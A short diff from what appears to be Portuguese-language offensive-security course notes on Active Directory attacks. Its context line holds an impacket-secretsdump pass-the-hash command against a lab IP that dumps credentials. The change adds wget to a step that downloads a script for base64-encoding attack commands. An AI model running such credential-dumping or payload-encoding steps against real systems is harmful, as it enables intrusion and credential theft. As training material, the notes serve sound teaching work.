@@ -183,7 +183,7 @@ impacket-secretsdump smith@192.168.2.126 -hashes aad3b435b51404eeaad3b435b51404e
 
 Baixando Script que encoda o comando em base64
 ```
-https://raw.githubusercontent.com/thiagosmith/pos-cti-adint/refs/heads/main/Modulo03/scripts/encode-command.py
+wget https://raw.githubusercontent.com/thiagosmith/pos-cti-adint/refs/heads/main/Modulo03/scripts/encode-command.py
 ```
 
 Editando o script de acordo com o nosso comando:
